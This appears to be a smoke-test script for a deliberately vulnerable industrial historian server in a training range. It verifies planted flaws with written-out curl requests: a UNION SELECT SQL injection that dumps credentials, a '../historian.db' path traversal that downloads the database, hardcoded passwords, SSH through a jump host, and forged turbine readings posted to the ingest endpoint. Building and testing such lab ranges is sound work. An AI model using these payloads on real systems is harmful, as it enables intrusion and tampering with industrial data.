#!/usr/bin/env bash
# uupl-historian Windows Server 2019 facade smoke test
#
# Coverage:
#   Identity: whoami, hostname, ipconfig (single NIC), netstat
#   Configuration: historian.ini (all credential sets, HEX-1847 and HEX-2291 tickets)
#   Data discovery: README.txt (documents path traversal), dir Data\ (historian.db)
#   Archive schedule: export_schedule.txt (lists traversal path as a note)
#   PSReadLine: history shows admin queries against the database
#   Web status: /status reachable, no auth required
#   Web assets: /assets returns live tag names
#   Web SQL injection: /report union select dumps config table (HEX-1847)
#   Web path traversal: /export?tag=../historian.db serves raw database (HEX-2291)
#   Web ingest: POST /ingest with hist_read:history2017 accepted
#   SSH auth: hist_admin/Historian2015 via wizzards-retreat jump
#   Credential chain: hist_read/history2017 (from historian.ini) injects a reading
#
# Usage: bash tests/smoke/test_uupl_historian_facade.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

HIST="uupl-historian"
JUMP="wizzards-retreat"
ATTACKER="unseen-gate"

require_running "$HIST"
require_running "$JUMP"
require_running "$ATTACKER"

hist() { in_container "$HIST" /usr/local/bin/winserver2019_shell.sh -c "$1"; }

HIST_IP=$(container_ip "$HIST" operational)

echo "[uupl-historian] Waiting for SSH on $HIST_IP..."
if ! wait_for_port "$JUMP" "$HIST_IP" 22 30; then
    fail "uupl-historian :22 not ready within 30s"
    summary; exit 1
fi

# ── Identity ──────────────────────────────────────────────────────────────────

echo "[uupl-historian] Identity"

WHOAMI_OUT="$(hist "whoami")"
assert_contains "$WHOAMI_OUT" "hist_admin" "whoami contains hist_admin"

HOST_OUT="$(hist "hostname")"
assert_contains "$HOST_OUT" "HIST-SRV01" "hostname returns HIST-SRV01"

IPCFG_OUT="$(hist "ipconfig")"
assert_contains "$IPCFG_OUT" "${HIST_IP//./\\.}" "ipconfig shows operational IP ($HIST_IP)"
assert_absent   "$IPCFG_OUT" "10\.10\.3\."        "ipconfig shows single NIC only (no control zone)"

NETSTAT_OUT="$(hist "netstat -ano")"
assert_contains "$NETSTAT_OUT" "8080" "netstat shows port 8080 (historian web)"
assert_contains "$NETSTAT_OUT" "22"   "netstat shows port 22 (sshd)"

# ── Configuration file ────────────────────────────────────────────────────────

echo "[uupl-historian] Configuration file"

INI_OUT="$(hist 'cat C:\Historian\Config\historian.ini')"
assert_contains "$INI_OUT" "Historian2015"  "historian.ini contains Historian2015"
assert_contains "$INI_OUT" "hist_read"      "historian.ini contains hist_read ingest account"
assert_contains "$INI_OUT" "history2017"    "historian.ini contains history2017 ingest password"
assert_contains "$INI_OUT" "HEX-1847"       "historian.ini documents SQL injection as known issue"
assert_contains "$INI_OUT" "HEX-2291"       "historian.ini documents path traversal (never filed)"

# ── Data discovery ────────────────────────────────────────────────────────────

echo "[uupl-historian] Data discovery"

README_OUT="$(hist 'cat C:\Historian\Data\README.txt')"
assert_contains "$README_OUT" "historian\.db" "Data README.txt names the database file"
assert_contains "$README_OUT" "export\?tag=\.\./historian\.db|path traversal|export" \
    "Data README.txt documents the path traversal URL"

DIR_DATA="$(hist 'dir C:\Historian\Data\')"
assert_contains "$DIR_DATA" "historian\.db" "dir Data\ lists historian.db"

SCHED_OUT="$(hist 'cat C:\Historian\Archive\export_schedule.txt')"
assert_contains "$SCHED_OUT" "tag=\.\./historian\.db|historian\.db|traversal" \
    "export_schedule.txt includes traversal path as a note"

# ── PSReadLine history ─────────────────────────────────────────────────────────

echo "[uupl-historian] PSReadLine history"

HIST_TXT="$(hist 'cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt')"
assert_contains "$HIST_TXT" "sqlite3|historian\.db|/report|8080" \
    "PSReadLine history shows historian admin queries"

# ── Web interface: read endpoints ─────────────────────────────────────────────

echo "[uupl-historian] Web interface"

STATUS_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    "http://${HIST_IP}:8080/status")"
assert_contains "$STATUS_OUT" "ok|running|historian" \
    "/status returns service-running response (no auth required)"

ASSETS_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    "http://${HIST_IP}:8080/assets")"
assert_contains "$ASSETS_OUT" "turbine_rpm"    "/assets lists turbine_rpm tag"
assert_contains "$ASSETS_OUT" "line_voltage_a" "/assets lists line_voltage_a tag"

REPORT_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    "http://${HIST_IP}:8080/report?asset=turbine_rpm&from=2024-01-01&to=2099-01-01")"
assert_contains "$REPORT_OUT" "timestamp,value,unit" \
    "/report returns CSV rows for turbine_rpm (no auth)"

# ── Web interface: SQL injection (HEX-1847) ───────────────────────────────────

echo "[uupl-historian] SQL injection"

SQLI_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    "http://${HIST_IP}:8080/report?asset=x%27+UNION+SELECT+key%2Cvalue%2C%27x%27+FROM+config--&from=0&to=9")"
assert_contains "$SQLI_OUT" "Historian2015|ssh_pass|db_pass" \
    "/report SQL injection returns credentials from config table (HEX-1847)"

# ── Web interface: path traversal (HEX-2291) ──────────────────────────────────

echo "[uupl-historian] Path traversal"

TRAV_FILE=/tmp/historian_trav_test_$$.db
in_container "$JUMP" curl -s --max-time 30 \
    "http://${HIST_IP}:8080/export?tag=../historian.db" > "$TRAV_FILE" 2>/dev/null
TRAV_SIZE=$(wc -c < "$TRAV_FILE" 2>/dev/null || echo 0)
rm -f "$TRAV_FILE"
if [ "$TRAV_SIZE" -gt 4096 ]; then
    ok "/export?tag=../historian.db serves the raw SQLite database (${TRAV_SIZE} bytes)"
else
    fail "/export?tag=../historian.db returned ${TRAV_SIZE} bytes (expected >4096)"
fi

# ── Web interface: ingest ─────────────────────────────────────────────────────

echo "[uupl-historian] Ingest"

INGEST_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    -X POST -H 'Content-Type: application/json' \
    -u hist_read:history2017 \
    -d "{\"timestamp\":\"2026-05-21T00:00:00\",\"asset\":\"turbine_rpm\",\"value\":3000,\"unit\":\"RPM\"}" \
    "http://${HIST_IP}:8080/ingest")"
assert_contains "$INGEST_OUT" "ok|200|inserted|accepted" \
    "hist_read/history2017 authenticates against /ingest and injection accepted"

# ── SSH auth via jump ─────────────────────────────────────────────────────────

echo "[uupl-historian] SSH authentication"

SSH_OUT="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    hist_admin "$HIST_IP" Historian2015)"
assert_contains "$SSH_OUT" "SSH_OK" \
    "hist_admin/Historian2015 authenticates via wizzards-retreat jump"

SSH_CMD="$(ssh_password_login_via_jump "$ATTACKER" \
    rincewind 10.10.0.10 wizzard \
    hist_admin "$HIST_IP" Historian2015 \
    "hostname")"
assert_contains "$SSH_CMD" "HIST-SRV01" \
    "SSH exec via jump: hostname returns HIST-SRV01 through facade"

# ── Credential chain ──────────────────────────────────────────────────────────

echo "[uupl-historian] Credential chain"

CHAIN_OUT="$(in_container "$JUMP" curl -s --max-time 10 \
    -X POST -H 'Content-Type: application/json' \
    -u hist_read:history2017 \
    -d "{\"timestamp\":\"2026-05-21T00:01:00\",\"asset\":\"turbine_rpm\",\"value\":2999,\"unit\":\"RPM\"}" \
    "http://${HIST_IP}:8080/ingest")"
assert_contains "$CHAIN_OUT" "ok|200|inserted|accepted" \
    "hist_read/history2017 (from historian.ini) injects a reading — ingest poisoning path confirmed"

summary
